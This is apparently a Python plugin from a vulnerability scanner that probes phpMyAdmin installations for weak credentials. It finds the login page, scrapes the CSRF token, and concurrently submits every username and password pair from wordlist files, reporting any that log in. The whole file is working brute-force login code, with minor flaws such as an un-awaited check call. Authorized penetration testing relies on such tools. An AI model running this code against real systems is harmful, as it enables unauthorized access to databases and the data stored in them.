#!/usr/bin/env python3

import re
import urllib
import asyncio
from app.lib.common import get_useragent
from app.lib.request import request

class Phpmyadmin_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Phpmyadmin弱口令漏洞',
            'description': 'Phpmyadmin弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        self.headers = {
            'User-Agent': get_useragent()
        }
    
    async def handle(self, url, user, pwd):
        
        """
        发送请求,判断内容

        :param str url: 请求url
        :param str user: 用户名
        :param str pwd: 密码

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">', 'class="disableAjax" title=']
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
            res_html = opener.open(url).read()
            token = re.search('name="token" value="(.*?)" />', res_html.decode('utf-8'))
            token_hash = urllib.request.quote(token.group(1))
            postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (user, pwd, token_hash)
            res = opener.open(url, postdata.encode('utf-8'))
            res_html = res.read()
            for flag in flag_list:
                if flag in res_html.decode('utf-8'):
                    result = "user: %s pwd: %s" %(user, pwd)
                    return True, '存在Phpmyadmin弱口令漏洞,弱口令为: ' + result
        except Exception as e:
            # print(e)
            pass

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        
        urls = []
        check_url = ''
        urls.append(self.url + '/index.php')
        urls.append(self.url + '/phpmyadmin/index.php')
        try:
            for url in urls:
                url_req = await request.get(url, headers = self.headers)
                if '<title>phpMyAdmin</title>' in await url_req.text() and 'input_password' in await url_req.text() and 'name="token"' in await url_req.text() and url_req.status:
                    check_url = url
            if check_url:
                tasks = []
                for user in open('app/data/username.txt', 'r', encoding = 'utf-8').readlines():
                    user = user.strip()
                    for pwd in open('app/data/password.txt', 'r', encoding = 'utf-8').readlines():
                        if pwd != '':
                            pwd = pwd.strip()
                        task = asyncio.create_task(self.handle(check_url, user, pwd))
                        tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                for result in results:
                    if result:
                        return True, result[1]
        except Exception as e:
            # print(e)
            pass

if __name__ == "__main__":
    Phpmyadmin_Weakpwd = Phpmyadmin_Weakpwd_BaseVerify('http://127.0.0.1:8080')
    Phpmyadmin_Weakpwd.check()